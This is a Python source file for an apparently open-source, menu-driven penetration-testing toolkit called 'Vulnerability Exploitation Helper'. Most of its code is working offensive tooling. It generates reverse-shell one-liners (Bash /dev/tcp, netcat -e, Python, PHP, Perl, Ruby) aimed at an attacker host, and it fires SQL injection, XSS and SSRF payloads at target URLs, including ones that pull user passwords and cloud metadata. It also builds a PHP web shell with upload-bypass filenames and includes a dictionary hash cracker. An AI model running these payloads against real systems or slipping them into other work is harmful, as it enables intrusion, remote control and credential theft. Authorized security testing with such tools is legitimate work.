#!/usr/bin/env python3
# MIT License
#
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import requests
from urllib.parse import quote, unquote, urlparse
import urllib3
import random
import string
import socket
import hashlib
import binascii
import base64
import sys
import os
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

"""
Python 3 Vulnerability Exploitation Helper Script

A Comprehensive Toolkit for Ethical Hackers and Penetration Testers

This script is designed to streamline common vulnerability exploitation tasks during authorized penetration testing engagements. It provides a user-friendly, menu-driven interface to generate payloads, test for vulnerabilities, and assist in network and web exploitation. The tool is modular, extensible, and built with Python 3 for cross-platform compatibility.

Author: [Solo]
GitHub: [https://github.com/solo2121/sysadmin-security-scripts]
License: MIT License

WARNING: This tool is for authorized penetration testing and educational purposes only.
Unauthorized use against systems you don't own or have permission to test is illegal.

Features:
- Reverse Shell Generator (Python, Bash, PHP, Netcat, Perl, Ruby)
- Payload Encoder/Decoder (Base64, URL, Hex)
- Web Exploitation Tools (SQLi, XSS, Directory Bruteforce, SSRF)
- Network Exploitation Tools (Port Scanner, Banner Grabber, Packet Sniffer)
- Password Cracking Utilities (Hash ID, Hash Cracker, Password Generator)
- File Operations (Upload/Download Helpers, Content Viewer)

Dependencies:
- Python 3.x
- Optional: pcapy (for packet sniffing)
"""

# Required imports

# Optional import for packet sniffing
try:
    import pcapy
    PCAPY_AVAILABLE = True
except ImportError:
    PCAPY_AVAILABLE = False

# Suppress additional warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ExploitHelper:
    def __init__(self):
        self.BANNER = """
        ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
        ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
        █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
        ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
        ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
        ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
        Vulnerability Exploitation Helper Tool v1.0
        """

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def display_menu(self):
        self.clear_screen()
        print(self.BANNER)
        print("Main Menu:")
        print("1. Reverse Shell Generator")
        print("2. Payload Encoder/Decoder")
        print("3. Web Exploitation Tools")
        print("4. Network Exploitation Tools")
        print("5. Password Cracking Utilities")
        print("6. File Operations")
        print("7. Exit")
        choice = input("\nSelect an option: ")
        return choice

    def reverse_shell_menu(self):
        self.clear_screen()
        print("Reverse Shell Generator:")
        print("1. Python Reverse Shell")
        print("2. Bash Reverse Shell")
        print("3. PHP Reverse Shell")
        print("4. Netcat Reverse Shell")
        print("5. Perl Reverse Shell")
        print("6. Ruby Reverse Shell")
        print("7. Back to Main Menu")

        choice = input("\nSelect an option: ")
        if choice == '1':
            self.python_reverse_shell()
        elif choice == '2':
            self.bash_reverse_shell()
        elif choice == '3':
            self.php_reverse_shell()
        elif choice == '4':
            self.netcat_reverse_shell()
        elif choice == '5':
            self.perl_reverse_shell()
        elif choice == '6':
            self.ruby_reverse_shell()
        elif choice == '7':
            return
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")

    def python_reverse_shell(self):
        self.clear_screen()
        print("Python Reverse Shell Generator")
        print("------------------------------")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")

        payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

        print("\nGenerated Python Reverse Shell:")
        print(payload)
        input("\nPress Enter to continue...")

    def bash_reverse_shell(self):
        self.clear_screen()
        print("Bash Reverse Shell Generator")
        print("------------------------------")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")

        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

        print("\nGenerated Bash Reverse Shell:")
        print(payload)
        input("\nPress Enter to continue...")

    def php_reverse_shell(self):
        self.clear_screen()
        print("PHP Reverse Shell Generator")
        print("------------------------------")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")

        payload = f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""

        print("\nGenerated PHP Reverse Shell:")
        print(payload)
        input("\nPress Enter to continue...")

    def netcat_reverse_shell(self):
        self.clear_screen()
        print("Netcat Reverse Shell Generator")
        print("------------------------------")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")

        print("\nChoose Netcat version:")
        print("1. Traditional netcat")
        print("2. Ncat (Nmap version)")
        print("3. Netcat with -e flag")
        version = input("Select version: ")

        if version == '1':
            payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        elif version == '2':
            payload = f"ncat {lhost} {lport} -e /bin/bash"
        elif version == '3':
            payload = f"nc -e /bin/bash {lhost} {lport}"
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")
            return

        print("\nGenerated Netcat Reverse Shell:")
        print(payload)
        input("\nPress Enter to continue...")

    def perl_reverse_shell(self):
        self.clear_screen()
        print("Perl Reverse Shell Generator")
        print("------------------------------")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")

        payload = f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""

        print("\nGenerated Perl Reverse Shell:")
        print(payload)
        input("\nPress Enter to continue...")

    def ruby_reverse_shell(self):
        self.clear_screen()
        print("Ruby Reverse Shell Generator")
        print("------------------------------")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")

        payload = f"""ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

        print("\nGenerated Ruby Reverse Shell:")
        print(payload)
        input("\nPress Enter to continue...")

    def encoder_decoder_menu(self):
        self.clear_screen()
        print("Payload Encoder/Decoder:")
        print("1. Base64 Encoder")
        print("2. Base64 Decoder")
        print("3. URL Encoder")
        print("4. URL Decoder")
        print("5. Hex Encoder")
        print("6. Hex Decoder")
        print("7. Back to Main Menu")

        choice = input("\nSelect an option: ")
        if choice == '1':
            self.base64_encode()
        elif choice == '2':
            self.base64_decode()
        elif choice == '3':
            self.url_encode()
        elif choice == '4':
            self.url_decode()
        elif choice == '5':
            self.hex_encode()
        elif choice == '6':
            self.hex_decode()
        elif choice == '7':
            return
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")

    def base64_encode(self):
        self.clear_screen()
        print("Base64 Encoder")
        print("------------------------------")
        data = input("Enter text to encode: ")
        encoded = base64.b64encode(data.encode()).decode()
        print("\nEncoded Result:")
        print(encoded)
        input("\nPress Enter to continue...")

    def base64_decode(self):
        self.clear_screen()
        print("Base64 Decoder")
        print("------------------------------")
        data = input("Enter text to decode: ")
        try:
            decoded = base64.b64decode(data.encode()).decode()
            print("\nDecoded Result:")
            print(decoded)
        except:
            print("\nError: Invalid Base64 input!")
        input("\nPress Enter to continue...")

    def url_encode(self):
        self.clear_screen()
        print("URL Encoder")
        print("------------------------------")
        data = input("Enter text to encode: ")
        encoded = quote(data)
        print("\nEncoded Result:")
        print(encoded)
        input("\nPress Enter to continue...")

    def url_decode(self):
        self.clear_screen()
        print("URL Decoder")
        print("------------------------------")
        data = input("Enter text to decode: ")
        decoded = unquote(data)
        print("\nDecoded Result:")
        print(decoded)
        input("\nPress Enter to continue...")

    def hex_encode(self):
        self.clear_screen()
        print("Hex Encoder")
        print("------------------------------")
        data = input("Enter text to encode: ")
        encoded = binascii.hexlify(data.encode()).decode()
        print("\nEncoded Result:")
        print(encoded)
        input("\nPress Enter to continue...")

    def hex_decode(self):
        self.clear_screen()
        print("Hex Decoder")
        print("------------------------------")
        data = input("Enter text to decode: ")
        try:
            decoded = binascii.unhexlify(data.encode()).decode()
            print("\nDecoded Result:")
            print(decoded)
        except:
            print("\nError: Invalid Hex input!")
        input("\nPress Enter to continue...")

    def web_exploitation_menu(self):
        self.clear_screen()
        print("Web Exploitation Tools:")
        print("1. SQLi Test")
        print("2. XSS Test")
        print("3. Directory Bruteforcer")
        print("4. SSRF Test")
        print("5. Back to Main Menu")

        choice = input("\nSelect an option: ")
        if choice == '1':
            self.sql_injection_test()
        elif choice == '2':
            self.xss_test()
        elif choice == '3':
            self.directory_bruteforcer()
        elif choice == '4':
            self.ssrf_test()
        elif choice == '5':
            return
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")

    def sql_injection_test(self):
        self.clear_screen()
        print("SQL Injection Tester")
        print("------------------------------")
        url = input("Enter target URL (with parameter): ")

        # Basic SQLi test payloads
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' UNION SELECT null,username,password FROM users--",
            "' OR SLEEP(5)--"
        ]

        parsed = urlparse(url)
        param = parsed.query.split('=')[0] if '=' in parsed.query else None

        if not param:
            print("Error: No parameter found in URL")
            input("\nPress Enter to continue...")
            return

        print("\nTesting for SQL Injection vulnerabilities...\n")

        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            try:
                response = requests.get(test_url, timeout=5)
                print(f"Payload: {payload}")
                print(f"Status Code: {response.status_code}")
                print(f"Response Length: {len(response.text)}")
                print("----------------------------------")
            except Exception as e:
                print(f"Error with payload {payload}: {str(e)}")

        input("\nPress Enter to continue...")

    def xss_test(self):
        self.clear_screen()
        print("XSS Tester")
        print("------------------------------")
        url = input("Enter target URL (with parameter): ")

        # Basic XSS test payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]

        parsed = urlparse(url)
        param = parsed.query.split('=')[0] if '=' in parsed.query else None

        if not param:
            print("Error: No parameter found in URL")
            input("\nPress Enter to continue...")
            return

        print("\nTesting for XSS vulnerabilities...\n")

        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            try:
                response = requests.get(test_url, timeout=5)
                print(f"Payload: {payload}")
                print(f"Status Code: {response.status_code}")
                if payload in response.text:
                    print("Possible XSS vulnerability found!")
                print("----------------------------------")
            except Exception as e:
                print(f"Error with payload {payload}: {str(e)}")

        input("\nPress Enter to continue...")

    def directory_bruteforcer(self):
        self.clear_screen()
        print("Directory Bruteforcer")
        print("------------------------------")
        url = input("Enter target URL (e.g., http://example.com/): ")
        wordlist = input(
            "Enter path to wordlist (or press Enter for default): ")

        if not wordlist:
            # Default common directories
            directories = [
                "admin", "login", "wp-admin", "backup", "config",
                "phpmyadmin", "test", "secret", "api", "cgi-bin"
            ]
        else:
            try:
                with open(wordlist, 'r') as f:
                    directories = [line.strip() for line in f]
            except:
                print("Error reading wordlist file!")
                input("\nPress Enter to continue...")
                return

        print("\nStarting directory bruteforce...\n")

        for directory in directories:
            target = f"{url}/{directory}"
            try:
                response = requests.get(target, timeout=5)
                if response.status_code == 200:
                    print(
                        f"[+] Found: {target} (Status: {response.status_code})")
                elif response.status_code == 403:
                    print(
                        f"[!] Forbidden: {target} (Status: {response.status_code})")
                elif response.status_code == 301 or response.status_code == 302:
                    print(
                        f"[+] Redirect: {target} => {response.headers['Location']} (Status: {response.status_code})")
            except:
                pass

        input("\nPress Enter to continue...")

    def ssrf_test(self):
        self.clear_screen()
        print("SSRF Tester")
        print("------------------------------")
        url = input(
            "Enter target URL with parameter (e.g., http://example.com/api?url=): ")

        # Basic SSRF test payloads
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://localhost",
            "http://127.0.0.1",
            "http://internal.service"
        ]

        parsed = urlparse(url)
        param = parsed.query.split('=')[0] if '=' in parsed.query else None

        if not param:
            print("Error: No parameter found in URL")
            input("\nPress Enter to continue...")
            return

        print("\nTesting for SSRF vulnerabilities...\n")

        for payload in payloads:
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            try:
                response = requests.get(test_url, timeout=5)
                print(f"Payload: {payload}")
                print(f"Status Code: {response.status_code}")
                print(f"Response Length: {len(response.text)}")
                print("----------------------------------")
            except Exception as e:
                print(f"Error with payload {payload}: {str(e)}")

        input("\nPress Enter to continue...")

    def network_exploitation_menu(self):
        self.clear_screen()
        print("Network Exploitation Tools:")
        print("1. Port Scanner")
        print("2. Banner Grabber")
        print("3. Simple Network Sniffer")
        print("4. Back to Main Menu")

        choice = input("\nSelect an option: ")
        if choice == '1':
            self.port_scanner()
        elif choice == '2':
            self.banner_grabber()
        elif choice == '3':
            self.simple_sniffer()
        elif choice == '4':
            return
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")

    def port_scanner(self):
        self.clear_screen()
        print("Simple Port Scanner")
        print("------------------------------")
        target = input("Enter target IP or hostname: ")
        ports = input("Enter ports to scan (e.g., 80,443 or 1-100): ")

        try:
            if '-' in ports:
                start, end = map(int, ports.split('-'))
                port_list = range(start, end+1)
            else:
                port_list = [int(p.strip()) for p in ports.split(',')]
        except:
            print("Invalid port range!")
            input("\nPress Enter to continue...")
            return

        print(f"\nScanning {target}...\n")

        open_ports = []
        for port in port_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    print(f"[+] Port {port} is open")
                    open_ports.append(port)
                sock.close()
            except:
                pass

        print("\nScan completed!")
        input("\nPress Enter to continue...")

    def banner_grabber(self):
        self.clear_screen()
        print("Banner Grabber")
        print("------------------------------")
        target = input("Enter target IP or hostname: ")
        port = input("Enter port: ")

        try:
            port = int(port)
        except:
            print("Invalid port!")
            input("\nPress Enter to continue...")
            return

        print(f"\nGrabbing banner from {target}:{port}...\n")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, port))

            # Try to receive some data
            try:
                banner = sock.recv(1024).decode().strip()
                print(f"Banner: {banner}")
            except:
                print("No banner received, but port is open")

            sock.close()
        except Exception as e:
            print(f"Error: {str(e)}")

        input("\nPress Enter to continue...")

    def simple_sniffer(self):
        self.clear_screen()
        print("Simple Packet Sniffer (requires root)")
        print("------------------------------")
        print("This will capture the first 5 packets on the network interface.")
        print("Press Ctrl+C to stop early.")

        """Simple packet sniffer using pcapy (if available)"""
        if not PCAPY_AVAILABLE:
            print("Error: pcapy module not installed. Install with 'pip install pcapy'")
            input("\nPress Enter to continue...")
            return

        try:
            print("\nStarting packet capture...")
            import pcapy
            cap = pcapy.open_live("eth0", 65536, True, 100)

            def packet_handler(hdr, data):
                print(f"Packet of length {hdr.getlen()} received")

            cap.loop(5, packet_handler)
        except KeyboardInterrupt:
            print("\nCapture stopped by user")
        except Exception as e:
            print(f"Error: {str(e)}")

        input("\nPress Enter to continue...")

    def password_cracking_menu(self):
        self.clear_screen()
        print("Password Cracking Utilities:")
        print("1. Hash Identifier")
        print("2. Basic Hash Cracker (Dictionary Attack)")
        print("3. Password Generator")
        print("4. Back to Main Menu")

        choice = input("\nSelect an option: ")
        if choice == '1':
            self.hash_identifier()
        elif choice == '2':
            self.hash_cracker()
        elif choice == '3':
            self.password_generator()
        elif choice == '4':
            return
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")

    def hash_identifier(self):
        self.clear_screen()
        print("Hash Identifier")
        print("------------------------------")
        hash_input = input("Enter hash to identify: ").strip()

        # Common hash length patterns
        hash_length = len(hash_input)

        print("\nPossible hash types:")

        if hash_length == 32:
            print("- MD5")
            print("- MD4")
            print("- MD2")
            print("- Double MD5")
            print("- LM (part)")
        elif hash_length == 40:
            print("- SHA-1")
            print("- RIPEMD-160")
        elif hash_length == 56:
            print("- SHA-224")
        elif hash_length == 64:
            print("- SHA-256")
            print("- SHA3-256")
            print("- BLAKE2s-256")
        elif hash_length == 96:
            print("- SHA-384")
            print("- SHA3-384")
        elif hash_length == 128:
            print("- SHA-512")
            print("- SHA3-512")
            print("- BLAKE2b-512")
        elif hash_length == 16:
            print("- MySQL < 4.1")
        elif hash_length == 34 and hash_input.startswith('$P$'):
            print("- WordPress (MD5)")
        elif hash_length == 34 and hash_input.startswith('$H$'):
            print("- phpBB (MD5)")
        elif hash_input.startswith('$2a$') or hash_input.startswith('$2b$') or hash_input.startswith('$2y$'):
            print("- bcrypt")
        elif hash_input.startswith('$5$'):
            print("- SHA-256 (Unix)")
        elif hash_input.startswith('$6$'):
            print("- SHA-512 (Unix)")
        elif hash_input.startswith('$1$'):
            print("- MD5 (Unix)")
        else:
            print("- Unknown hash type")

        input("\nPress Enter to continue...")

    def hash_cracker(self):
        self.clear_screen()
        print("Basic Hash Cracker (Dictionary Attack)")
        print("------------------------------")
        hash_input = input("Enter hash to crack: ").strip()
        wordlist_path = input("Enter path to wordlist: ")

        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                words = [line.strip() for line in f]
        except:
            print("Error reading wordlist file!")
            input("\nPress Enter to continue...")
            return

        print("\nStarting cracking process...")

        # Try common hash algorithms
        algorithms = [
            ('md5', hashlib.md5),
            ('sha1', hashlib.sha1),
            ('sha256', hashlib.sha256),
            ('sha512', hashlib.sha512)
        ]

        found = False
        for word in words:
            for name, algorithm in algorithms:
                hashed = algorithm(word.encode()).hexdigest()
                if hashed == hash_input:
                    print(f"\n[+] Found password: {word} (Algorithm: {name})")
                    found = True
                    break
            if found:
                break

        if not found:
            print("\n[-] Password not found in wordlist")

        input("\nPress Enter to continue...")

    def password_generator(self):
        self.clear_screen()
        print("Password Generator")
        print("------------------------------")
        length = input("Enter password length (default 12): ") or "12"
        count = input(
            "Enter number of passwords to generate (default 5): ") or "5"

        try:
            length = int(length)
            count = int(count)
        except:
            print("Invalid input!")
            input("\nPress Enter to continue...")
            return

        print("\nGenerated passwords:")
        for _ in range(count):
            chars = string.ascii_letters + string.digits + string.punctuation
            password = ''.join(random.choice(chars) for _ in range(length))
            print(password)

        input("\nPress Enter to continue...")

    def file_operations_menu(self):
        self.clear_screen()
        print("File Operations:")
        print("1. File Upload Helper")
        print("2. File Download Helper")
        print("3. File Content Viewer")
        print("4. Back to Main Menu")

        choice = input("\nSelect an option: ")
        if choice == '1':
            self.file_upload_helper()
        elif choice == '2':
            self.file_download_helper()
        elif choice == '3':
            self.file_content_viewer()
        elif choice == '4':
            return
        else:
            print("Invalid choice!")
            input("Press Enter to continue...")

    def file_upload_helper(self):
        self.clear_screen()
        print("File Upload Helper")
        print("------------------------------")
        print("This generates various file upload bypass techniques")

        print("\n1. Basic Image Upload with PHP Code")
        print("2. Double Extension (e.g., .jpg.php)")
        print("3. Null Byte Injection (e.g., .jpg%00.php)")
        print("4. Case Manipulation (e.g., .PhP)")
        print("5. All techniques")
        option = input("\nSelect an option: ")

        if option not in ['1', '2', '3', '4', '5']:
            print("Invalid choice!")
            input("\nPress Enter to continue...")
            return

        php_code = "<?php system($_GET['cmd']); ?>"

        print("\nGenerated payloads:")

        if option == '1' or option == '5':
            print("\n1. Basic Image with PHP Code:")
            print("Create a file with magic bytes for image then PHP code")
            print("Example for GIF:")
            print(f"GIF89a;{php_code}")

        if option == '2' or option == '5':
            print("\n2. Double Extension:")
            print("shell.jpg.php")
            print("shell.png.pHp")
            print("shell.jpeg.php5")

        if option == '3' or option == '5':
            print("\n3. Null Byte Injection:")
            print("shell.jpg%00.php")
            print("shell.png%00.php5")
            print("(Note: %00 should be URL encoded null byte)")

        if option == '4' or option == '5':
            print("\n4. Case Manipulation:")
            print("shell.pHp")
            print("shell.PHP5")
            print("shell.Jpg")

        input("\nPress Enter to continue...")

    def file_download_helper(self):
        self.clear_screen()
        print("File Download Helper")
        print("------------------------------")
        print("This generates commands to download files in various ways")

        print("\n1. Using wget")
        print("2. Using curl")
        print("3. Using Python")
        print("4. Using PHP")
        print("5. Using Perl")
        print("6. All methods")
        option = input("\nSelect an option: ")

        if option not in ['1', '2', '3', '4', '5', '6']:
            print("Invalid choice!")
            input("\nPress Enter to continue...")
            return

        url = "http://example.com/file.txt"
        output = "downloaded_file"

        print("\nGenerated commands:")

        if option == '1' or option == '6':
            print("\n1. Using wget:")
            print(f"wget {url} -O {output}")
            print(f"wget -q {url} -O {output}  # Quiet mode")

        if option == '2' or option == '6':
            print("\n2. Using curl:")
            print(f"curl {url} -o {output}")
            print(f"curl -s {url} -o {output}  # Silent mode")

        if option == '3' or option == '6':
            print("\n3. Using Python:")
            print(
                f"""python -c 'import urllib.request; urllib.request.urlretrieve("{url}", "{output}")'""")

        if option == '4' or option == '6':
            print("\n4. Using PHP:")
            print(
                f"""php -r 'file_put_contents("{output}", file_get_contents("{url}"));'""")

        if option == '5' or option == '6':
            print("\n5. Using Perl:")
            print(
                f"""perl -e 'use LWP::Simple; getstore("{url}", "{output}");'""")

        input("\nPress Enter to continue...")

    def file_content_viewer(self):
        self.clear_screen()
        print("File Content Viewer")
        print("------------------------------")
        print("This generates commands to view file contents in various ways")

        print("\n1. Using cat")
        print("2. Using more/less")
        print("3. Using head/tail")
        print("4. Using Python")
        print("5. Using PHP")
        print("6. All methods")
        option = input("\nSelect an option: ")

        if option not in ['1', '2', '3', '4', '5', '6']:
            print("Invalid choice!")
            input("\nPress Enter to continue...")
            return

        filename = "/etc/passwd"

        print("\nGenerated commands:")

        if option == '1' or option == '6':
            print("\n1. Using cat:")
            print(f"cat {filename}")
            print(f"cat {filename} | more  # For long files")

        if option == '2' or option == '6':
            print("\n2. Using more/less:")
            print(f"more {filename}")
            print(f"less {filename}")

        if option == '3' or option == '6':
            print("\n3. Using head/tail:")
            print(f"head {filename}  # First 10 lines")
            print(f"tail {filename}  # Last 10 lines")
            print(f"head -n 20 {filename}  # First 20 lines")

        if option == '4' or option == '6':
            print("\n4. Using Python:")
            print(f"""python -c 'print(open("{filename}").read())'""")

        if option == '5' or option == '6':
            print("\n5. Using PHP:")
            print(f"""php -r 'echo file_get_contents("{filename}");'""")

        input("\nPress Enter to continue...")

    def run(self):
        while True:
            choice = self.display_menu()
            if choice == '1':
                self.reverse_shell_menu()
            elif choice == '2':
                self.encoder_decoder_menu()
            elif choice == '3':
                self.web_exploitation_menu()
            elif choice == '4':
                self.network_exploitation_menu()
            elif choice == '5':
                self.password_cracking_menu()
            elif choice == '6':
                self.file_operations_menu()
            elif choice == '7':
                print("\nExiting...")
                break
            else:
                print("Invalid choice!")
                input("Press Enter to continue...")


if __name__ == "__main__":
    try:
        helper = ExploitHelper()
        helper.run()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
